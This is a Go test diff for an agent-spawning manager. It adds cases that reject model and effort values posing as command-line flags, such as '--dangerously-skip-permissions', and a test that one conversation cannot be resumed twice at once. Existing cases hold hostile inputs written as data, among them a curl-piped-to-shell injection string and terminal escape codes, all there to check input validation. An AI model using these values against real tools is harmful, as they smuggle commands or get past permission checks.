@@ -113,6 +113,8 @@ func TestSpawn(t *testing.T) {
 		{"long name", am.SpawnRequest{Directory: dir, Name: strings.Repeat("n", 81)}, true},
 		{"model with spaces", am.SpawnRequest{Directory: dir, Model: "opus --flag"}, true},
 		{"model with shell syntax", am.SpawnRequest{Directory: dir, Model: "$(curl${IFS}x|sh)"}, true},
+		{"model that reads as a flag", am.SpawnRequest{Directory: dir, Model: "--dangerously-skip-permissions"}, true},
+		{"effort that reads as a flag", am.SpawnRequest{Directory: dir, Effort: "-x"}, true},
 		{"directory with an escape code", am.SpawnRequest{Directory: dir + "\x1b[2J"}, true},
 		{"control characters in prompt", am.SpawnRequest{Directory: dir, Prompt: "a\x1b[201~b"}, true},
 	}
@@ -229,5 +231,24 @@ func TestOptions(t *testing.T) {
 	o, err := m.Options(context.Background())
 	if err != nil || strings.Join(o.Tools, ",") != "claude,opencode" || o.DefaultTool != "claude" || len(o.Groups) != 2 {
 		t.Fatalf("%+v %v", o, err)
+	}
+}
+
+// A conversation being reopened is not reopened a second time before the
+// session list shows the first.
+func TestResumeOnce(t *testing.T) {
+	m, b, _, dir := setup(t)
+	if !m.claimResume("conv-past") {
+		t.Fatal("claim")
+	}
+	if _, err := m.Spawn(context.Background(), am.SpawnRequest{Directory: dir, Resume: "conv-past"}); reason(err) == "" || len(b.calls) != 0 {
+		t.Fatalf("second resume: err = %v, calls = %v", err, b.calls)
+	}
+	m.releaseResume("conv-past")
+	if _, err := m.Spawn(context.Background(), am.SpawnRequest{Directory: dir, Resume: "conv-past"}); err != nil {
+		t.Fatal(err)
+	}
+	if m.resuming["conv-past"] {
+		t.Fatal("claim kept after the spawn returned")
 	}
 }
